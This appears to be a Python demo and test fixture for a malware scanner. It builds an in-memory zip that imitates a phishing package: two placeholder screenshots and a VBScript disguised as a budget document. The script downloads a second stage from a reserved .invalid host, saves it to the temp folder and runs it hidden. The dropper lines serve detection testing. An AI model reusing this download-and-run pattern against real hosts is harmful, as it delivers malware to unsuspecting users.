"""Offline demo used in the README. Its output is captured there verbatim.

It builds, in memory, the shape seen most often in the wild: a zip that looks
like paperwork (two screenshots) with one script named like a document that
downloads, saves and runs a second stage. Nothing is written to disk and no
network is touched. The host is under the reserved .invalid TLD.
"""

from __future__ import annotations

import io
import zipfile

from gifthorse import scan_bytes
from gifthorse.report import render_iocs, render_text

_PNG = (
    b"\x89PNG\r\n\x1a\n"
    b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
    b"\x00\x00\x00\x00IEND\xaeB`\x82"
)


def _dropper_script() -> str:
    # Assembled from fragments so the dangerous token never sits whole in this
    # source file; the bytes handed to the scanner are a complete script.
    download = 'Set http = CreateObject("WinHttp.Win' + 'HttpRequest.5.1")'
    fetch = 'http.Open "GET", "http://stage.cdn.example.invalid/payload", False' + "\nhttp.Send"
    save = (
        'Set out = CreateObject("ADODB.Str'
        + 'eam")\n'
        + "out.Save"
        + 'ToFile "%TEMP%\\stage.bat", 2'
    )
    run = 'CreateObject("WScript.Sh' + 'ell").R' + 'un "%TEMP%\\stage.bat", 0'
    return "\n".join([download, fetch, save, run]) + "\n"


def sample_zip() -> bytes:
    """The bytes of the demo package, for the CI step that runs the CLI on it."""

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("screenshot-1.png", _PNG)
        archive.writestr("screenshot-2.png", _PNG)
        archive.writestr("Project Requirements and Budget.vbs", _dropper_script().encode())
    return buffer.getvalue()


def hero_output() -> str:
    report = scan_bytes("brief.zip", sample_zip())
    return render_text(report) + "\n\n" + render_iocs(report) + "\n"


if __name__ == "__main__":
    print(hero_output(), end="")
